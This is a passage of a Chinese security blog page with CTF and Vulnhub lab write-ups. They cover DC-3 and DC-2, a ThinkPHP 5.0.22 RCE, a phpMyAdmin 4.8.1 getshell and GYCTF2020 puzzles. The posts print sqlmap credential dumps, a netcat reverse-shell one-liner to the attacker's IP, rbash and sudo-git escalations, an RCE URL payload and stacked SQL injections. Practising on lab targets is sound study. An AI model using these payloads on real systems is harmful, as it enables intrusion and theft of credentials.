<!DOCTYPE html>
<html>
<head>
  <meta charset="utf-8">
  

  
  <title>Hexo</title>
  <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1">
  <meta property="og:type" content="website">
<meta property="og:title" content="Hexo">
<meta property="og:url" content="http://yoursite.com/page/2/index.html">
<meta property="og:site_name" content="Hexo">
<meta property="og:locale" content="en_US">
<meta property="article:author" content="John Doe">
<meta name="twitter:card" content="summary">
  
    <link rel="alternate" href="/atom.xml" title="Hexo" type="application/atom+xml">
  
  
    <link rel="icon" href="/favicon.png">
  
  
    <link href="//fonts.googleapis.com/css?family=Source+Code+Pro" rel="stylesheet" type="text/css">
  
  
<link rel="stylesheet" href="/css/style.css">

<meta name="generator" content="Hexo 4.2.0"></head>

<body>
  <div id="container">
    <div id="wrap">
      <header id="header">
  <div id="banner"></div>
  <div id="header-outer" class="outer">
    <div id="header-title" class="inner">
      <h1 id="logo-wrap">
        <a href="/" id="logo">Hexo</a>
      </h1>
      
    </div>
    <div id="header-inner" class="inner">
      <nav id="main-nav">
        <a id="main-nav-toggle" class="nav-icon"></a>
        
          <a class="main-nav-link" href="/">Home</a>
        
          <a class="main-nav-link" href="/archives">Archives</a>
        
      </nav>
      <nav id="sub-nav">
        
          <a id="nav-rss-link" class="nav-icon" href="/atom.xml" title="RSS Feed"></a>
        
        <a id="nav-search-btn" class="nav-icon" title="Search"></a>
      </nav>
      <div id="search-form-wrap">
        <form action="//google.com/search" method="get" accept-charset="UTF-8" class="search-form"><input type="search" name="q" class="search-form-input" placeholder="Search"><button type="submit" class="search-form-submit">&#xF002;</button><input type="hidden" name="sitesearch" value="http://yoursite.com"></form>
      </div>
    </div>
  </div>
</header>
      <div class="outer">
        <section id="main">
  
    <article id="post-DC-3vulnhub渗透测试" class="article article-type-post" itemscope itemprop="blogPost">
  <div class="article-meta">
    <a href="/2020/03/04/DC-3vulnhub%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/" class="article-date">
  <time datetime="2020-03-04T09:12:19.000Z" itemprop="datePublished">2020-03-04</time>
</a>
    
  </div>
  <div class="article-inner">
    
    
      <header class="article-header">
        
  
    <h1 itemprop="name">
      <a class="article-title" href="/2020/03/04/DC-3vulnhub%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/">DC-3vulnhub渗透测试</a>
    </h1>
  

      </header>
    
    <div class="article-entry" itemprop="articleBody">
      
        <h1 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h1><p>DC:3-vulnhub渗透测试</p>
<p>靶机IP:192.168.1.175</p>
<p>KaliIP:192.168.1.124</p>
<h1 id="渗透过程"><a href="#渗透过程" class="headerlink" title="渗透过程"></a>渗透过程</h1><p>nmap扫描端口：</p>
<p><img src="/.com//1.png" alt></p>
<p>由于这里只有一个端口80，所以直接访问80端口</p>
<p> 所以直接访问80端口</p>
<p><img src="/.com//2.png" alt="image-20200303215131162"></p>
<p>看到这里的登录框，并且可以得知这里有一个账号是<code>admin</code></p>
<p>尝试用hydra爆破无果</p>
<p>尝试扫描目录，然后发现<code>/adminnistor</code>以及<code>README.txt</code></p>
<p>这是我发现的可用信息。通过README.txt发现这里<code>joomla 3.7.0</code></p>
<p>searchsploit查找一下</p>
<p><img src="/.com//3.png" alt="image-20200303220345138"></p>
<p>刚开始尝试这几个exp,但是无果</p>
<p>但是偶然发现这里的joomla是3.7.0版本的。这里的漏洞在在于joomla 3.7.0的一个sql注入</p>
<p><img src="/.com//4.png" alt="image-20200303220658291"></p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sqlmap -u <span class="string">"http://192.168.1.175/index.php?option=com_fields&amp;view=fields&amp;layout=modal&amp;list[fullordering]=updatexml"</span> --risk=<span class="number">3</span> --level=<span class="number">5</span> --random-agent --dbs -p <span class="keyword">list</span>[fullordering]</span><br></pre></td></tr></table></figure>

<p><img src="/.com//5.png" alt="image-20200303221149698"></p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sqlmap -u <span class="string">"http://192.168.1.175/index.php?option=com_fields&amp;view=fields&amp;layout=modal&amp;list[fullordering]=updatexml"</span> --risk=<span class="number">3</span> --level=<span class="number">5</span> --random-agent -D joomladb --tables -p <span class="keyword">list</span>[fullordering]</span><br></pre></td></tr></table></figure>

<p><img src="/.com//6.png" alt="image-20200303221344523"></p>
<p>然后这里有一个<code>#__users</code>表，爆列名</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sqlmap -u <span class="string">"http://192.168.1.175/index.php?option=com_fields&amp;view=fields&amp;layout=modal&amp;list[fullordering]=updatexml"</span> --risk=<span class="number">3</span> --level=<span class="number">5</span> --random-agent -D <span class="string">"joomladb"</span> -T <span class="string">"#__users"</span> --columns -p <span class="keyword">list</span>[fullordering]</span><br></pre></td></tr></table></figure>

<p><img src="/.com//7.png" alt="image-20200303224241763"></p>
<p>就可以把数据库数据dump出来</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sqlmap -u <span class="string">"http://192.168.1.175/index.php?option=com_fields&amp;view=fields&amp;layout=modal&amp;list[fullordering]=updatexml"</span> --risk=<span class="number">3</span> --level=<span class="number">5</span> --random-agent -D <span class="string">"joomladb"</span> -T <span class="string">"#__users"</span> -C <span class="string">"id,username,password"</span> --dump -p <span class="keyword">list</span>[fullordering]</span><br></pre></td></tr></table></figure>

<p><img src="/.com//8.png" alt="image-20200303224644783"></p>
<p>然后使用john进行爆破，得账号密码</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">admin::snoopy</span><br></pre></td></tr></table></figure>



<p>然后登陆后台<code>/administrator</code></p>
<p>在<code>Extensions -&gt; Templates -&gt;styles</code></p>
<p><img src="/.com//9.png" alt="image-20200303225616035"></p>
<p>发现protostar是默认的模块</p>
<p>然后我们就可以去修改其模块</p>
<p><img src="/.com//10.png" alt="image-20200303234906208"></p>
<p>成了，然后可以反弹shell.这里有一个很重要的信息，就是这里的操作系统是<code>ubuntu 16.04.2</code></p>
<p>然后可以反弹shell.写入shell代码，并监听端口</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">system(<span class="string">"rm /tmp/f;mkfifo /tmp/f;cat /tmp/f | /bin/sh -i 2&gt;&amp;1 | nc 192.168.1.124 7777 &gt;/tmp/f"</span>);</span><br></pre></td></tr></table></figure>

<p>获得tty</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python -c <span class="string">"import pty; pty.spawn('/bin/bash')"</span></span><br></pre></td></tr></table></figure>



<p>然后就是提权了，因为这里是<code>ubuntu 16.04.2</code></p>
<p>存在一个内核漏洞CVE-2017-16995</p>
<p>然后剩下的提权，不会了……所以看了别的师傅的wt</p>
<p><a href="https://blog.csdn.net/weixin_43583637/article/details/101554815" target="_blank" rel="noopener">https://blog.csdn.net/weixin_43583637/article/details/101554815</a></p>
<h1 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h1><p>信息收集很重要…..</p>

      
    </div>
    <footer class="article-footer">
      <a data-url="http://yoursite.com/2020/03/04/DC-3vulnhub%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/" data-id="ck8sqr5hq0007kou5g58o120l" class="article-share-link">Share</a>
      
      
    </footer>
  </div>
  
</article>


  
    <article id="post-DC-2vulnhub渗透测试" class="article article-type-post" itemscope itemprop="blogPost">
  <div class="article-meta">
    <a href="/2020/03/04/DC-2vulnhub%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/" class="article-date">
  <time datetime="2020-03-04T09:08:12.000Z" itemprop="datePublished">2020-03-04</time>
</a>
    
  </div>
  <div class="article-inner">
    
    
      <header class="article-header">
        
  
    <h1 itemprop="name">
      <a class="article-title" href="/2020/03/04/DC-2vulnhub%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/">DC-2vulnhub渗透测试</a>
    </h1>
  

      </header>
    
    <div class="article-entry" itemprop="articleBody">
      
        <h1 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h1><p>DC:2-vulnhub渗透测试</p>
<p>靶机IP:192.168.1.170</p>
<p>kaLiIP:192.168.1.124</p>
<h1 id="渗透过程"><a href="#渗透过程" class="headerlink" title="渗透过程"></a>渗透过程</h1><p>nmap扫描端口</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">nmap -sS -Pn -A -p 1-65535 192.168.1.170</span><br></pre></td></tr></table></figure>

<p><img src="/.com//3.png" alt="image-20200228152255605"></p>
<p>这里有一个80端口的站点是wordpress</p>
<p>访问80端口看一下，这里看到flag1</p>
<p><img src="/.com//4.png" alt="image-20200228152836680"></p>
<p>这里说我们要用cewl获取一个字典文件。</p>
<p>我们扫描一个这个站点，使用wpscan</p>
<figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">wpscan --url http://dc-2 -e u</span><br></pre></td></tr></table></figure>

<p><img src="/.com//5.png" alt="image-20200228153212655"></p>
<p>然后我们就接着生成字典，再去爆破一个这几个用户名</p>
<figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">cewl http://dc-2/ -w pass</span><br><span class="line">wpscan --url http://dc-2 -U admin/jerry/tom -P pass</span><br></pre></td></tr></table></figure>

<p><img src="/.com//6.png" alt="image-20200228153635619"></p>
<p><img src="/.com//7.png" alt="image-20200228153739430"></p>
<figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">jerry / adipiscing   </span><br><span class="line">tom / parturient</span><br></pre></td></tr></table></figure>

<p>然后用这两个账号登陆，tom这个账号没有可用的东西，然后在jerry这个账号中发现了flag2</p>
<p><img src="/.com//8.png" alt="image-20200228153902313"></p>
<p>说明wordpress没有可用的东西了</p>
<p>思路转向ssh</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">ssh tom@<span class="number">192.168</span><span class="number">.1</span><span class="number">.170</span> -p <span class="number">7744</span></span><br><span class="line">  adipiscing</span><br></pre></td></tr></table></figure>

<p>查看一下，发现能用的命令很少，tom 这是一个rbash</p>
<p><img src="/.com//9.png" alt="image-20200228154252622"></p>
<p>但是在tom中发现了flag3</p>
<p><img src="/.com//10.png" alt="image-20200228154353684"></p>
<p>提示说使用su，但是rbash让我们很无力，所以使用vi来补全功能，获得新shell</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">vi <span class="number">1.</span>txt</span><br><span class="line">:set shell=/bin/sh</span><br><span class="line">:shell</span><br></pre></td></tr></table></figure>

<p>通过export查看环境变量。</p>
<p><img src="/.com//11.png" alt="image-20200228154909465"></p>
<p><img src="/.com//14.png" alt="image-20200228154957211"></p>
<p><img src="/.com//15.png" alt="image-20200228154957211"></p>
<p>转到jerry用户，然后查看flag4.txt</p>
<p>说是git提权</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">sudo git -p help config</span><br><span class="line">!/bin/sh</span><br></pre></td></tr></table></figure>

<p><img src="/.com//C:%5CUsers%5Ccookie%5CAppData%5CRoaming%5CTypora%5Ctypora-user-images%5Cimage-20200228155525660.png" alt="image-20200228155525660"></p>
<h1 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h1><p>vi修改shell要学习一下</p>

      
    </div>
    <footer class="article-footer">
      <a data-url="http://yoursite.com/2020/03/04/DC-2vulnhub%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/" data-id="ck8sqr5hm0006kou5cumv8s8k" class="article-share-link">Share</a>
      
      
    </footer>
  </div>
  
</article>


  
    <article id="post-THINKPHP5-0-22远程代码执行漏洞分析及复现" class="article article-type-post" itemscope itemprop="blogPost">
  <div class="article-meta">
    <a href="/2020/02/29/THINKPHP5-0-22%E8%BF%9C%E7%A8%8B%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90%E5%8F%8A%E5%A4%8D%E7%8E%B0/" class="article-date">
  <time datetime="2020-02-29T13:48:45.000Z" itemprop="datePublished">2020-02-29</time>
</a>
    
  </div>
  <div class="article-inner">
    
    
      <header class="article-header">
        
  
    <h1 itemprop="name">
      <a class="article-title" href="/2020/02/29/THINKPHP5-0-22%E8%BF%9C%E7%A8%8B%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90%E5%8F%8A%E5%A4%8D%E7%8E%B0/">THINKPHP5.0.22远程代码执行漏洞分析及复现</a>
    </h1>
  

      </header>
    
    <div class="article-entry" itemprop="articleBody">
      
        <h1 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h1><p>THINKPHP5.0.22远程代码执行漏洞分析及复现</p>
<h1 id="漏洞分析"><a href="#漏洞分析" class="headerlink" title="漏洞分析"></a>漏洞分析</h1><p>exp如下：</p>
<figure class="highlight"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">/public/index.php?s=index/think\app/invokefunction&amp;function=call_user_func_array&amp;vars[0]=system&amp;vars[1][]=whoami</span><br></pre></td></tr></table></figure>

<p><img src="/.com//17.png" alt="image-20200309202158419"></p>
<p>使用debug来跟一下漏洞的触发过程</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">namespace</span> <span class="title">think</span>;</span><br><span class="line"></span><br><span class="line"><span class="comment">// ThinkPHP 引导文件</span></span><br><span class="line"><span class="comment">// 1. 加载基础文件</span></span><br><span class="line"><span class="keyword">require</span> <span class="keyword">__DIR__</span> . <span class="string">'/base.php'</span>;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 2. 执行应用</span></span><br><span class="line">App::run()-&gt;send();</span><br></pre></td></tr></table></figure>



<p>跟进run()，看到关键代码。</p>
<p><img src="/.com//2.png" alt="image-20200310000602256"></p>
<p>这里的<code>$dispatch</code>是空的，也就是未设置调度</p>
<p><img src="/.com//3.png" alt="image-20200310001903943"></p>
<p>跟进routeCheck()</p>
<p><img src="/.com//4.png" alt="image-20200310002112545"></p>
<p>其中<code>$path,$depr</code></p>
<p><img src="/.com//5.png" alt="image-20200310002312139"></p>
<p><img src="/.com//7.png" alt="image-20200310002842897"></p>
<p>经过路由检测后,到这一行代码</p>
<p><img src="/.com//6.png" alt="image-20200310002644385"></p>
<p>跟进函数<code>parseUrl()</code></p>
<p><img src="/.com//8.png" alt="image-20200310003123751"></p>
<p>在这一行代码中,<code>$url</code>被分成存入<code>$path</code></p>
<p><img src="/.com//9.png" alt="image-20200310003314054"></p>
<p>解析模块，控制器，操作</p>
<p><img src="/.com//10.png" alt="image-20200310003754654"></p>
<p>然后封装路由</p>
<p><img src="/.com//11.png" alt="image-20200310004003373"></p>
<p><img src="/.com//12.png" alt="image-20200310004018935"></p>
<p>回到<code>App.php</code></p>
<p><img src="/.com//13.png" alt="image-20200310004135712"></p>
<p>关键代码</p>
<p><img src="/.com//14.png" alt="image-20200310004205934"></p>
<p>跟进<code>exec()</code>这里跟进的是模块执行代码</p>
<p><img src="/.com//15.png" alt="image-20200310004520405"></p>
<p>在<code>module()</code>中</p>
<p><img src="/.com//16.png" alt="image-20200310005005866"></p>
<p><img src="/.com//17.png" alt="image-20200310005146448"></p>
<p><img src="/.com//18.png" alt="image-20200310005237947"></p>
<p>跟进<code>invokeMethod()</code></p>
<p><img src="/.com//19.png" alt="image-20200310005605132"></p>
<p><img src="/.com//21.png" alt="image-20200310005659885"></p>
<p>到此调用<code>call_user_function()</code></p>
<p><img src="/.com//22.png" alt="image-20200310005909300"></p>
<h1 id="参考"><a href="#参考" class="headerlink" title="参考"></a>参考</h1><p><a href="https://www.cnblogs.com/st404/p/10245844.html" target="_blank" rel="noopener">THINKPHP5.0.22远程代码执行漏洞分析及复现</a></p>

      
    </div>
    <footer class="article-footer">
      <a data-url="http://yoursite.com/2020/02/29/THINKPHP5-0-22%E8%BF%9C%E7%A8%8B%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90%E5%8F%8A%E5%A4%8D%E7%8E%B0/" data-id="ck8sqr5iv000lkou562y90j8j" class="article-share-link">Share</a>
      
      
    </footer>
  </div>
  
</article>


  
    <article id="post-phpmyadmin4-8-1后台getshell" class="article article-type-post" itemscope itemprop="blogPost">
  <div class="article-meta">
    <a href="/2020/02/29/phpmyadmin4-8-1%E5%90%8E%E5%8F%B0getshell/" class="article-date">
  <time datetime="2020-02-29T13:45:44.000Z" itemprop="datePublished">2020-02-29</time>
</a>
    
  </div>
  <div class="article-inner">
    
    
      <header class="article-header">
        
  
    <h1 itemprop="name">
      <a class="article-title" href="/2020/02/29/phpmyadmin4-8-1%E5%90%8E%E5%8F%B0getshell/">phpmyadmin4.8.1后台getshell</a>
    </h1>
  

      </header>
    
    <div class="article-entry" itemprop="articleBody">
      
        <h1 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h1><p>phpmyadmin4.8.1后台getshell</p>
<h1 id="漏洞分析"><a href="#漏洞分析" class="headerlink" title="漏洞分析"></a>漏洞分析</h1><p><img src="/.com//1.png" alt="image-20200313065902595"></p>
<p>在index.php中有，关键代码在</p>
<p><img src="/.com//2.png" alt="image-20200313070231479"></p>
<p>其中的<code>Core::checkPageValidity()</code>，跟进一下</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">static</span> <span class="function"><span class="keyword">function</span> <span class="title">checkPageValidity</span><span class="params">(&amp;$page, array $whitelist = [])</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">if</span> (<span class="keyword">empty</span>($whitelist)) &#123;</span><br><span class="line">        $whitelist = <span class="keyword">self</span>::$goto_whitelist;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span> (! <span class="keyword">isset</span>($page) || !is_string($page)) &#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">false</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (in_array($page, $whitelist)) &#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">true</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    $_page = mb_substr(</span><br><span class="line">        $page,</span><br><span class="line">        <span class="number">0</span>,</span><br><span class="line">        mb_strpos($page . <span class="string">'?'</span>, <span class="string">'?'</span>)</span><br><span class="line">    );</span><br><span class="line">    <span class="keyword">if</span> (in_array($_page, $whitelist)) &#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">true</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    $_page = urldecode($page);</span><br><span class="line">    $_page = mb_substr(</span><br><span class="line">        $_page,</span><br><span class="line">        <span class="number">0</span>,</span><br><span class="line">        mb_strpos($_page . <span class="string">'?'</span>, <span class="string">'?'</span>)</span><br><span class="line">    );</span><br><span class="line">    <span class="keyword">if</span> (in_array($_page, $whitelist)) &#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">true</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> <span class="keyword">false</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>没什么过滤，只有对白名单的验证，然后这里为了绕过<code>urldecode()</code></p>
<p>我们<code>urlencode()</code>两次，绕过验证</p>
<p>getshell的时候，现在写入一个列名为<code>&lt;?php phpinfo();?&gt;</code></p>
<p>找到其位置，然后执行</p>
<p><img src="/.com//3.png" alt="image-20200313071530353"></p>

      
    </div>
    <footer class="article-footer">
      <a data-url="http://yoursite.com/2020/02/29/phpmyadmin4-8-1%E5%90%8E%E5%8F%B0getshell/" data-id="ck8sqr5k6001bkou5482hcthw" class="article-share-link">Share</a>
      
      
    </footer>
  </div>
  
</article>


  
    <article id="post-GYCTF2020" class="article article-type-post" itemscope itemprop="blogPost">
  <div class="article-meta">
    <a href="/2020/02/26/GYCTF2020/" class="article-date">
  <time datetime="2020-02-26T13:41:21.000Z" itemprop="datePublished">2020-02-26</time>
</a>
    
  </div>
  <div class="article-inner">
    
    
      <header class="article-header">
        
  
    <h1 itemprop="name">
      <a class="article-title" href="/2020/02/26/GYCTF2020/">GYCTF2020</a>
    </h1>
  

      </header>
    
    <div class="article-entry" itemprop="articleBody">
      
        <h1 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h1><p>GYCTF2020-web</p>
<h1 id="练习"><a href="#练习" class="headerlink" title="练习"></a>练习</h1><h2 id="GYCTF2020-Blacklist"><a href="#GYCTF2020-Blacklist" class="headerlink" title="[GYCTF2020]Blacklist"></a>[GYCTF2020]Blacklist</h2><p><img src="/.com//1.png" alt="image-20200316103108980"></p>
<p>强网杯的payload用不了了</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="number">1</span><span class="string">';</span></span><br><span class="line"><span class="string">SeT @a=0x73656c656374202a2066726f6d20603139313938313039333131313435313460;</span></span><br><span class="line"><span class="string">prepare execsql from @a;</span></span><br><span class="line"><span class="string">execute execsql;#</span></span><br></pre></td></tr></table></figure>



<p>然后这里使用<code>handler</code></p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="number">1</span><span class="string">';</span></span><br><span class="line"><span class="string">HANDLER FlagHere OPEN;</span></span><br><span class="line"><span class="string">HANDLER FlagHere READ FIRST;</span></span><br><span class="line"><span class="string">HANDLER FlagHere CLOSE;#</span></span><br></pre></td></tr></table></figure>

<p><code>HANDLER ... OPEN</code>语句打开一个表，使其可以使用后续<code>HANDLER ... READ</code>语句访问，该表对象未被其他会话共享，并且在会话调用<code>HANDLER ... CLOSE</code>或会话终止之前不会关闭.</p>
<p>官方<a href="https://dev.mysql.com/doc/refman/8.0/en/handler.html" target="_blank" rel="noopener">文档</a></p>
<h2 id="GYCTF2020-Easyphp"><a href="#GYCTF2020-Easyphp" class="headerlink" title="[GYCTF2020]Easyphp"></a>[GYCTF2020]Easyphp</h2><p>考点：反序列化，反序列化字符逃逸</p>
<p>登陆后，一看就知道这是个审计题</p>
<p><img src="/.com//2.png" alt="image-20200316223238193"></p>
<p>在<code>www.zip</code>中发现了源码</p>
<p>审计源码</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//index.php</span></span><br><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">require_once</span> <span class="string">"lib.php"</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>($_GET[<span class="string">'action'</span>]))&#123;</span><br><span class="line">	<span class="keyword">require_once</span>(<span class="keyword">__DIR__</span>.<span class="string">"/"</span>.$_GET[<span class="string">'action'</span>].<span class="string">".php"</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">else</span>&#123;</span><br><span class="line">	<span class="keyword">if</span>($_SESSION[<span class="string">'login'</span>]==<span class="number">1</span>)&#123;</span><br><span class="line">		<span class="keyword">echo</span> <span class="string">"&lt;script&gt;window.location.href='./index.php?action=update'&lt;/script&gt;"</span>;</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="keyword">else</span>&#123;</span><br><span class="line">		<span class="keyword">echo</span> <span class="string">"&lt;script&gt;window.location.href='./index.php?action=login'&lt;/script&gt;"</span>;</span><br><span class="line">	&#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>

<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//login.php</span></span><br><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">require_once</span>(<span class="string">'lib.php'</span>);</span><br><span class="line"><span class="meta">?&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="meta">&lt;?php</span> </span><br><span class="line">$user=<span class="keyword">new</span> user();</span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>($_POST[<span class="string">'username'</span>]))&#123;</span><br><span class="line">	<span class="keyword">if</span>(preg_match(<span class="string">"/union|select|drop|delete|insert|\#|\%|\`|\@|\\\\/i"</span>, $_POST[<span class="string">'username'</span>]))&#123;</span><br><span class="line">		<span class="keyword">die</span>(<span class="string">"&lt;br&gt;Damn you, hacker!"</span>);</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="keyword">if</span>(preg_match(<span class="string">"/union|select|drop|delete|insert|\#|\%|\`|\@|\\\\/i"</span>, $_POST[<span class="string">'password'</span>]))&#123;</span><br><span class="line">		<span class="keyword">die</span>(<span class="string">"Damn you, hacker!"</span>);</span><br><span class="line">	&#125;</span><br><span class="line">	$user-&gt;login();</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>

<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//update.php</span></span><br><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">require_once</span>(<span class="string">'lib.php'</span>);</span><br><span class="line"><span class="keyword">echo</span> <span class="string">'&lt;html&gt;</span></span><br><span class="line"><span class="string">&lt;meta charset="utf-8"&gt;</span></span><br><span class="line"><span class="string">&lt;title&gt;update&lt;/title&gt;</span></span><br><span class="line"><span class="string">&lt;h2&gt;这是一个未完成的页面，上线时建议删除本页面&lt;/h2&gt;</span></span><br><span class="line"><span class="string">&lt;/html&gt;'</span>;</span><br><span class="line"><span class="keyword">if</span> ($_SESSION[<span class="string">'login'</span>]!=<span class="number">1</span>)&#123;</span><br><span class="line">	<span class="keyword">echo</span> <span class="string">"你还没有登陆呢！"</span>;</span><br><span class="line">&#125;</span><br><span class="line">$users=<span class="keyword">new</span> User();</span><br><span class="line">$users-&gt;update();</span><br><span class="line"><span class="keyword">if</span>($_SESSION[<span class="string">'login'</span>]===<span class="number">1</span>)&#123;</span><br><span class="line">	<span class="keyword">require_once</span>(<span class="string">"flag.php"</span>);</span><br><span class="line">	<span class="keyword">echo</span> $flag;</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>

